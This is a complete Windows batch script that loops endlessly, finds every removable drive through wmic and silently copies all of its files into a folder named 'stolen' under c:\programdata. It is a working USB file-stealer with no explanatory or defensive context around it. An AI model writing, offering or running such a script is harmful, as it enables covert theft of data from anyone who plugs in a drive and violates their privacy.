@echo off
:copy
for /f "skip=1" %%a in ('"wmic logicaldisk where drivetype=2 get deviceid 2>nul"') do (
echo %%a
xcopy %%a\*.* c:\programdata\stolen /d /y /i
)
goto copy




